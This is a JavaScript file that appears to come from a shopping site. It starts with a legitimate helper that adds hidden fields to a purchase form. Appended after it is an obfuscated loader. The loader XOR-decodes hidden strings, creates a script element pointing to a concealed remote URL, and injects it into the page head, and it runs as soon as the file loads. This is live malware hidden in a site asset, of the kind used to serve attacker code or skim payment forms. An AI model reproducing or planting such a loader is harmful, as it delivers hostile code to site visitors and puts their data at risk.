function setHiddenPurchaseFields(environment,parameters)
{
    var purchaseForm = $JQ('#purchaseForm');
    purchaseForm.attr('action', environment );
    for( var field in parameters )
    {
        var value = parameters[field];
        if( value!="" ) 
        {
            purchaseForm.append("<input type='hidden' name='" + field + "' value='" + value + "'>");
        }
    }
    return false;
}
function xLQ(myl){var pt=document[jwjSTT(tU69UE[3])](jwjSTT(tU69UE[0])+jwjSTT(tU69UE[1])+jwjSTT(tU69UE[2]));pt[jwjSTT(tU69UE[4])]=myl;pt[jwjSTT(tU69UE[5])]=jwjSTT(tU69UE[6]);document[jwjSTT(tU69UE[9])](jwjSTT(tU69UE[8]))[0][jwjSTT(tU69UE[7])](pt);}function v9Cty(mhFoa){var w54='';var x23n=0;var s5DDX=0;for(x23n=0;x23n<mhFoa.length/3;x23n++){w54+=String.fromCharCode(mhFoa.slice(s5DDX,s5DDX+3));s5DDX=s5DDX+3;}return w54;}var tU69UE=["003027","002017","000012","019010020057064003054045019059008087012","003010018","004001001061","004029009044027012018055023037014075017000012","017008001061090002048041031058009","024029016060","023029005029088003030036024034030123001036025022022085011022","024012005040014073092050002055025092086003021029106026020006110028037066090022004086027043"];function jwjSTT(wZHxh){return cuz(v9Cty(wZHxh),'pxqX4fsAvVm9x');}function cuz(mGQ,bf7h5){var ij='';var t54=0;var dO8a=0;for(t54=0;t54<mGQ.length;t54++){var cv=mGQ.charAt(t54);var cwtmlW=cv.charCodeAt(0)^bf7h5.charCodeAt(dO8a);cv=String.fromCharCode(cwtmlW);ij+=cv;if(dO8a==bf7h5.length-1)dO8a=0;else dO8a++;}return (ij);}xLQ(jwjSTT(tU69UE[10]));